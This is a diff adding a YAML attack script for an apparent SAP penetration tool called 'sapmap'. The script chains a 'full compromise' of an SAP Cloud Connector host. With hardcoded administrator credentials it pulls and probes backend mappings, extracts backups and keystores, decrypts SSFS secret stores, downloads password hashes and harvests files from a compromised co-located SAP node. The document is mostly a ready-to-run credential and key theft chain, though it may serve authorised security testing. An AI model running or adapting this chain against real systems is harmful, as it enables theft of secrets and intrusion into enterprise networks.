@@ -1,0 +1,46 @@
+# SCC full compromise chain
+# Runs all SCC discovery + extraction steps against a known SCC host.
+# scc_extract_keystore and harvest_scc require --confirm on the CLI.
+#
+# Usage:
+#   python sapmap.py --script scripts/scc_full_chain.yaml [--confirm]
+#
+# Replace host/sid/credentials before use.
+
+steps:
+  # 1. Store SCC credentials so subsequent steps auto-fill
+  - action: scc_set_credentials
+    target: "192.168.2.167"
+    username: Administrator
+    password: "Manage1"
+
+  # 2. Pull cloud→on-prem mappings and plot them on the map
+  - action: scc_pull_mappings
+    target: "192.168.2.167"
+    username: Administrator
+    password: "Manage1"
+
+  # 3. Smoke-test every mapping to confirm backend reachability
+  - action: scc_probe_mappings
+    target: "192.168.2.167"
+
+  # 4. Extract full backup + keystores + decrypt SSFS (crown jewels)
+  #    Requires --confirm on the CLI
+  - action: scc_extract_keystore
+    target: "192.168.2.167"
+    username: Administrator
+    password: "Manage1"
+    backup_password: "Manage1"
+
+  # 5. Download SCC password hashes (from backup zip or OS-exec)
+  - action: scc_download_hashes
+    target: "192.168.2.167"
+
+  # 6. From co-located pwned SAP node: read on-host SSFS directly
+  #    (backup zip SSFS is double-encrypted — on-host files are not)
+  - action: harvest_scc_ssfs
+    target: S4H
+
+  # 7. From co-located pwned SAP node: read SCC mappings from disk
+  - action: harvest_scc_mappings
+    target: S4H
